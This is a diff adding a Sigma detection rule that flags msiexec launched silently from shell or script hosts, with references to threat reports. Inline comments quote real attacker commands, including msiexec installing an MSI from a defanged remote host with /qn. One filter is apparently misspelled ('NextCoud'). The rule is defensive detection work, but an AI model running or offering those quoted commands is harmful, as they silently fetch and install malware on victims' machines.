@@ -1,0 +1,66 @@
+id: uSp0R2tqVX3U
+name: MsiExec Spawned by Shell Process (via cmdline)
+body: |-
+  title: MsiExec Spawned by Shell Process (via cmdline)
+  id: 7784e5a8-6699-4f8e-94fa-fc97ac0ff498
+  status: stable
+  description: Attackers might use cmd.exe or powershell.exe to execute msiexec.exe to silently install malicious software. it is highly recommended to baseline your activity and tune out common business use cases, usually used by administrators for software installation scripts, which might need to exclude some additional environment-related patterns.
+  references:
+      - https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat
+      - https://www.huntress.com/blog/chatgpt-custom-gpts-clickfix-rat
+      - https://zerobec.com/blog/operation-bluedash-multi-rmm-workplace-phishing
+      - https://www.elastic.co/security-labs/mexican-banking-fraud-scmbanker-ref6045
+      - https://www.microsoft.com/en-us/security/blog/2026/06/24/stealc-and-amadey-breaking-down-infostealers-and-the-cybercrime-services-that-deliver-them/
+      - https://www.netskope.com/blog/from-clickfix-to-maas-exposing-a-modular-windows-rat-and-its-admin-panel
+      - https://www.security.com/threat-intelligence/ukraine-russia-attacks
+      - https://cert.gov.ua/article/6280099
+      - https://cert.gov.ua/article/6279419
+      - https://blog.nviso.eu/2025/10/01/lunar-spider-expands-their-web-via-fakecaptcha/
+      - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/spiderlabs-ids-new-banking-trojan-distributed-through-whatsapp/
+      - https://www.forcepoint.com/blog/x-labs/screenconnect-attack
+      - https://www.proofpoint.com/us/blog/threat-insight/dont-trustconnect-its-a-rat?utm_source=twitter&utm_medium=social_organic
+      - https://www.sonicwall.com/blog/pdf-borne-living-off-the-land-attacks-with-rmm-abuse
+      - www.derp.ca/research/hellsuchecker-clickfix-etherhiding/
+      - https://www.stormshield.com/news/investigations-into-the-mimicrat-clickfix-campaign/
+      - https://www.malwarebytes.com/blog/threat-intel/2026/03/hacked-sites-deliver-vidar-infostealer-to-windows-users
+      - https://www.elastic.co/security-labs/silentconnect-delivers-screenconnect
+      - https://www.esentire.com/blog/etherrat-sys-info-module-c2-on-ethereum-etherhiding-target-selection-cdn-like-beacons
+  author: SOC Prime Team
+  tags:
+      - attack.defense_evasion
+      - attack.execution
+      - attack.t1218.007
+  logsource:
+      category: process_creation
+      product: windows
+  detection:
+      selection:
+          ParentImage|endswith:
+              - 'cmd.exe'
+              - 'powershell.exe' # https://www.stormshield.com/news/investigations-into-the-mimicrat-clickfix-campaign/; https://zerobec.com/blog/operation-bluedash-multi-rmm-workplace-phishing; https://www.huntress.com/blog/chatgpt-custom-gpts-clickfix-rat
+              - 'wscript.exe'
+              - 'cscript.exe'
+              - 'pythonw.exe'
+          Image|endswith: 'MsiExec.exe'
+          CommandLine|contains:
+              - '/q' # msiexec /i \\rappellingaart[.]com@SSL\secure-docs\Imp_Details.msi /qn https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat
+              - '/i' # msiexec /i \\rappellingaart[.]com@SSL\secure-docs\Imp_Details.msi /qn; cmd.exe /c Visa_Details.msi & Attachment-2.xls https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat; https://www.security.com/threat-intelligence/ukraine-russia-attacks; https://www.sonicwall.com/blog/pdf-borne-living-off-the-land-attacks-with-rmm-abuse
+              - '/passive' # msiexec.exe /i “<path>” /passive
+              - '/quiet' # msiexec /i "hosts.msi" /quiet /norestart
+              - '/norestart'
+      filters:
+          CommandLine|contains:
+              - 'ZNoDesktopShortCut=' #Zoom
+              - 'orbital_install' #cisco amp
+              - 'googlechromestandaloneenterprise64'
+              - '\Webex_'
+              - 'NextCoud'
+      condition: selection and not filters
+  falsepositives:
+      - Software updates.
+      - Software installers.
+      - Administrative scripts.
+  level: medium
+level: medium
+created: '2020-07-28T12:09:58Z'
+updated: '2026-11-03T10:26:40.988000Z'
